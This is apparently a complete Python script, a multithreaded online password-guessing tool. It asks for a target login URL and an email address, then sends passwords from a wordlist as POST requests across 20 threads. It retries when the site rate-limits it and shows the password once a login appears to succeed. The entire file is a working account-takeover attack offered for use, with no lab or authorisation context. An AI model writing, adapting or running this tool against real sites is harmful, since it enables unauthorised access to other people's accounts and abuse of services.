import requests
import time
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.text import Text
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading
from urllib.parse import urlparse
import re

console = Console()
progress_lock = threading.Lock()
found_password = None
session = None
target_url = None

ASCII_ART = """
╔═══╗     ╔╗ ╔═══╗╔═══╗╔╗╔═╗╔═══╗╔═══╗
║╔═╗║     ║║ ║╔═╗║║╔═╗║║║║╔╝║╔═╗║║╔═╗║
║║ ║║     ║║ ║║ ║║║║ ╚╝║╚╝╝ ║║ ╚╝║╚═╝║
║╚═╝║╔═══╗║║ ║║ ║║║║ ╔╗║╔╗║ ║║ ╔╗║╔╗╔╝
║╔═╗║╚═══╝║╚╗║╚═╝║║╚═╝║║║║╚╗║╚═╝║║║║╚╗
╚╝ ╚╝     ╚═╝╚═══╝╚═══╝╚╝╚═╝╚═══╝╚╝╚═╝
"""

def clear_screen():
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # Unix/Linux/MacOS
        os.system('clear')

def validate_url(url: str) -> bool:
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def validate_email(email: str) -> bool:
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(email_pattern, email))

def get_target_url() -> str:
    while True:
        console.print("[cyan]Enter the target website URL (e.g., http://example.com/login):[/cyan]")
        url = input().strip()
        
        if validate_url(url):
            return url
        else:
            console.print("[red]Invalid URL. Please enter a valid URL including http:// or https://[/red]")

def get_target_email() -> str:
    while True:
        console.print("[cyan]Enter the target email address:[/cyan]")
        email = input().strip()
        
        if validate_email(email):
            return email
        else:
            console.print("[red]Invalid email address. Please enter a valid email.[/red]")

def setup_session():
    global session
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=20, pool_maxsize=20)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

def try_password(email: str, password: str) -> bool:
    try:
        response = session.post(
            target_url,
            data={'email': email, 'password': password},
            timeout=5
        )
        
        # Check if response is JSON
        try:
            json_response = response.json()
            # Check common response patterns
            if 'success' in json_response:
                return json_response['success']
            elif 'status' in json_response:
                return json_response['status'] == 'success'
            elif 'error' in json_response:
                return not json_response['error']
        except ValueError:
            # If response is not JSON, check status code
            return response.status_code == 200 or response.status_code == 302
            
    except (requests.RequestException, ConnectionError, TimeoutError) as e:
        console.print(f"[red]Connection error: {str(e)}. Retrying...[/red]")
        time.sleep(1)
        return False

def try_password_batch(email: str, passwords: list, progress, task) -> tuple:
    global found_password
    
    for idx, password in enumerate(passwords):
        if found_password:
            return (False, None)
            
        if try_password(email, password):
            found_password = password
            return (True, password)
        
        if idx % 10 == 0:  # Update progress every 10 attempts
            with progress_lock:
                progress.update(task, advance=10)
                
    return (False, None)

def crack_password(wordlist_file: str):
    global found_password, target_url
    found_password = None
    
    # Display banner
    clear_screen()
    console.print(Panel(ASCII_ART, title="Password Cracker", style="bold blue"))
    
    # Get target URL and email
    target_url = get_target_url()
    target_email = get_target_email()
    
    setup_session()
    
    try:
        with open(wordlist_file, 'r') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        console.print(f"[red]Error: File '{wordlist_file}' not found.[/red]")
        return

    start_time = time.time()
    batch_size = 100
    password_batches = [passwords[i:i + batch_size] for i in range(0, len(passwords), batch_size)]
    
    console.print(f"[yellow]Starting attack on: {target_url}[/yellow]")
    console.print(f"[yellow]Target email: {target_email}[/yellow]")
    console.print(f"[yellow]Loaded {len(passwords)} passwords from wordlist[/yellow]\n")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
    ) as progress:
        task = progress.add_task("[cyan]Cracking password...", total=len(passwords))
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [
                executor.submit(try_password_batch, target_email, batch, progress, task)
                for batch in password_batches
            ]
            
            for future in as_completed(futures):
                success, password = future.result()
                if success:
                    elapsed_time = time.time() - start_time
                    attempts = len(passwords) - len(passwords[passwords.index(password):])
                    attempts_per_second = attempts / elapsed_time
                    
                    # Success animation
                    clear_screen()
                    console.print(ASCII_ART, style="green")
                    console.print("\n[green]Password found![/green]")
                    console.print(Panel.fit(
                        Text(f"""
Target URL: {target_url}
Email: {target_email}
Password: {password}
Time elapsed: {elapsed_time:.2f} seconds
Total attempts: {attempts}
Attempts per second: {attempts_per_second:.2f}
                        """.strip()),
                        title="Success",
                        style="green"
                    ))
                    return
    
    if not found_password:
        console.print("[red]Password not found in wordlist.[/red]")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        console.print("[red]Usage: python password_cracker.py wordlist.txt[/red]")
        sys.exit(1)
    
    crack_password(sys.argv[1]) 
